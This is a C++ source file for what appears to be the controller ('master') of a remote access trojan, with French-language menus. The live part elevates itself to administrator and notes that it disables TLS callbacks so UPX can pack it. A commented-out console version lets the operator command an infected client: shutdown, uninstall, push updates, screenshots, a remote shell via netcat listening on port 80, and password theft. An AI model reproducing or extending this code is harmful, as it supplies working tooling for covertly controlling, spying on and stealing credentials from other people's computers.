#include <QApplication>
#include <QMessageBox>

#include "MasterWindow.hpp"

#include <system/Process.hpp>
#include <system/Uac.hpp>

int run(int argc, char ** argv)
{
    int returnValue;
    try
    {
        QApplication app(argc, argv);
        Master::MasterWindow master;
        master.show();
        returnValue = app.exec();
    }
    catch(...)
    {
        LOG << "Unkown exception";
        return EXIT_FAILURE;
    }
    return returnValue;
}

//! if only Windows was an UNIX system...
#ifdef INNOCENCE_DEBUG
int main(int argc, char * argv[])
{
	LOG.setHeader("MASTER");
	LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));
	LOG.addObserver(new Common::LogToConsole);
#ifdef _WIN32
	System::Process::This thisProcess;
    if(!System::isAdministrator())
	{
        LOG << "Try to run as administrator.";
		System::RunAsAdministrator(thisProcess.getProgramName(), thisProcess.getProgramDir(), true);
		return EXIT_SUCCESS;
	}
	return run(thisProcess.getArgCount(), thisProcess.getArgs());
#else
    return run(argc, argv);
#endif
}
#else
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    LOG.setHeader("MASTER");
	LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));

    // administrator rights are preferred to execute the Server
    System::Process::This thisProcess;
    if(!System::isAdministrator())
	{
        LOG << "Try to run as administrator.";
		System::RunAsAdministrator(thisProcess.getProgramName(), thisProcess.getProgramDir(), true);
		return EXIT_SUCCESS;
	}
	return run(thisProcess.getArgCount(), thisProcess.getArgs());
}
#endif // INNOCENCE_DEBUG

//! disable Thread Local Storage callbacks, otherwise, UPX won't compress.
extern "C" void tss_cleanup_implemented(void){}

/*
#include <iostream>
#include <cstdlib>
using namespace std;

#include <network/TcpServer.hpp>
#include <common/Log.hpp>
#include <common/Menu.hpp>
#include <system/File.hpp>
#include <system/Process.hpp>
#include <blaspheme/protocol/Session.hpp>
#include <blaspheme/Blaspheme.hpp>
#include <blaspheme/transfer/FileTransfer.hpp>
using namespace Common;
using namespace Network;
using namespace Blaspheme;
using namespace System;

void command(Session& session);

class ExitCallback : public Callback
{
	public:
		ExitCallback() : Callback("Quitter"){}
		virtual void execute()
		{
			exiting = true;
		}
		
		static void exit(){exiting = true;}
		static bool exited(){return exiting;}

	private:
		static bool exiting;
};
bool ExitCallback::exiting = false;

class GetClientNameCallback : public Callback
{
	public:
		GetClientNameCallback(Session& _session) : Callback("Nom du client"), session(_session){}
		virtual void execute()
		{
			string buffer;
			session << GET_CLIENT_NAME;
			session >> buffer;
			cout << "Nom du client : " << buffer << "\n";
		}

	private:
		Session& session;
};

class SystemVersionCallback : public Callback
{
	public:
		SystemVersionCallback(Session& _session) : Callback("Version du systeme d'exploitation"), session(_session){}
		virtual void execute()
		{
			string buffer;
			session << GET_WINDOWS_VERSION;
			session >> buffer;
			cout << "Version systeme d'exploitation : " << buffer << "\n";
		}

	private:	
		Session& session;
};

class ShutdownCallback : public Callback
{
	public:
		
		ShutdownCallback(Session& _session) : Callback("Eteindre PC"), session(_session){}
		virtual void execute()
		{
			cout << "Extinction du client.\n";
			session << SHUTDOWN;
			ExitCallback::exit();
		}
	
	private:	
		Session& session;
};

class RebootCallback : public Callback
{
	public:
		
		RebootCallback(Session& _session) : Callback("Reboot PC"), session(_session){}
		virtual void execute()
		{
			cout << "Redemarrage du client.\n";
			session << REBOOT;
			ExitCallback::exit();
		}
	
	private:	
		Session& session;
};

class LogoutCallback : public Callback
{
	public:
		
		LogoutCallback(Session& _session) : Callback("Logout Session"), session(_session){}
		virtual void execute()
		{
			cout << "Fermeture de la session utilisateur.\n";
			session << LOGOUT;
			ExitCallback::exit();
		}
	
	private:	
		Session& session;
};

class HibernateCallback : public Callback
{
	public:
		
		HibernateCallback(Session& _session) : Callback("Mise en veille PC"), session(_session){}
		virtual void execute()
		{
			cout << "Mise en veille du client.\n";
			session << HIBERNATE;
			ExitCallback::exit();
		}
	
	private:	
		Session& session;
};

class KillClientCallback : public Callback
{
	public:
		
		KillClientCallback(Session& _session) : Callback("Tuer client"), session(_session){}
		virtual void execute()
		{
			cout << "Le programme client va etre tuer.\n";
			session << KILL_CLIENT;
			ExitCallback::exit();
		}
	
	private:	
		Session& session;
};

class RebootClientCallback : public Callback
{
	public:
		
		RebootClientCallback(Session& _session) : Callback("Redemarrer client"), session(_session){}
		virtual void execute()
		{
			cout << "Redemarrage du programme client.\n";
			session << REBOOT_CLIENT;
			ExitCallback::exit();
		}
	
	private:	
		Session& session;
};

class UninstallClientCallback : public Callback
{
	public:
		
		UninstallClientCallback(Session& _session) : Callback("Desinstaller client"), session(_session){}
		virtual void execute()
		{
			cout << "Desinstallation du programme client.\n";
			session << UNINSTALL_CLIENT;
			ExitCallback::exit();
		}
	
	private:	
		Session& session;
};

class UpdateClientCallback : public Callback
{
	public:
		
		UpdateClientCallback(Session& _session) : Callback("Mise a jour du client"), session(_session){}
		virtual void execute()
		{
			cout << "Mise a jour du client, entrer le chemin du nouveau client : ";
			string buffer;
			cin >> buffer;
			
			session << UPGRADE_CLIENT;
			string answer;
			session >> answer;
			if(answer == SUCCESS)
			{
				Upload upload(buffer, session.stream());
				upload.launch();
				session << REBOOT;
				cout << "Le client a ete correctement mis a jour.\n";
			}
			else
			{
				cout << "Impossible de mettre a jour le client.\n";
			}
		}
	
	private:	
		Session& session;
};

class ShellCallback : public Callback
{
	public:
		
		ShellCallback(Session& _session) : Callback("Shell a distance"), session(_session){}
		virtual void execute()
		{
			if(isReadable(SHELL_PROGRAM))
			{
				session << REMOTE_SHELL;
				system(".\\nc.exe -l -p 80");
			}
			else
			{
				cout << "Impossible de trouver " << SHELL_PROGRAM << '\n';
			}
		}
	
	private:	
		Session& session;
};

class ScreenshotCallback : public Callback
{
	public:
		
		ScreenshotCallback(Session& _session) : Callback("Screenshot"), session(_session){}
		virtual void execute()
		{
			cout << "Screenshot.\n";
			session << GET_SCREEN;
			string quality = "80";
			session << quality;
			string buffer_photo;
            InMemoryDownload download(buffer_photo, session.stream());
			download.launch();
			cout << "Taille de la photo : " + buffer_photo.size();
			
			string filename = "capture.jpg";
			ofstream outfile (filename.c_str(),ofstream::binary);
			outfile.write(buffer_photo.c_str(), buffer_photo.size());
			outfile.close();
			
			ShellExecute(NULL, "open", filename.c_str(), NULL, NULL, SW_SHOW);
		}
	
	private:	
		Session& session;
};

class GetPasswordsCallback : public Callback
{
	public:
		
		GetPasswordsCallback(Session& _session) : Callback("Recuperer mots de passe"), session(_session){}
		virtual void execute()
		{
			session << PASSWORDS_GETALL;
			LOG << "Waiting for passwords";
			string buffer;
			session >> buffer;
			if(buffer == FINISHED)
			{
				return;
			}
			LOG << "Passwords : " + buffer;
		}
	
	private:	
		Session& session;
};

class Bucket
{
	public:
		Bucket()
		{
			menu.add(new ExitCallback);
			menu.add(new GetClientNameCallback(session));
			menu.add(new SystemVersionCallback(session));
			menu.add(new ShutdownCallback(session));
			menu.add(new RebootCallback(session));
			menu.add(new LogoutCallback(session));
			menu.add(new HibernateCallback(session));
			menu.add(new KillClientCallback(session));
			menu.add(new RebootCallback(session));
			menu.add(new UninstallClientCallback(session));
			menu.add(new UpdateClientCallback(session));
			menu.add(new ShellCallback(session));
			menu.add(new ScreenshotCallback(session));
			menu.add(new GetPasswordsCallback(session));
		}
		
		void catchClient(Network::Port port, std::string password)
		{
			//session.setAuthentication(new StringBasedAuth(password));
			info.port = port;
			info.deadline.set(5);
			info.password = password;
			if(session.wait_connect(info))
			{
				cout << "Client connecte.\n";
				command(session);
				cout << "Deconnexion.\n";
			}
			else
			{
				cout << "Aucune connexion de client.\n";
			}
		}

		Menu menu;
		Session session;
		ConnectionInfo info;

	private:
		
		void command(Session& session)
		{
			while(!ExitCallback::exited())
			{
				menu.show();
				menu.prompt();
			}
		}
};

int main(int argc, char * argv[])
{
	if(argc != 3)
	{
		cout << "Usage : bucket port password\n";
		return EXIT_SUCCESS;
	}

	LOG.setHeader("BUCKET");
	LOG.addObserver(new LogToNetwork("127.0.0.1", 80));
	
	Network::Port port = 0;
	if(!fromString(argv[1], port))
	{
		cout << "Port d'ecoute invalide : " << argv[1] << '\n';
		return EXIT_FAILURE;
	}
	cout << "Port d'ecoute selectionne : " << port << '\n';
	try
	{
		Bucket bucket;
		bucket.catchClient(port, argv[2]);
	}
	catch(std::exception& e)
	{
		cout << e.what() << '\n';
	}
	return EXIT_SUCCESS;
}
*/
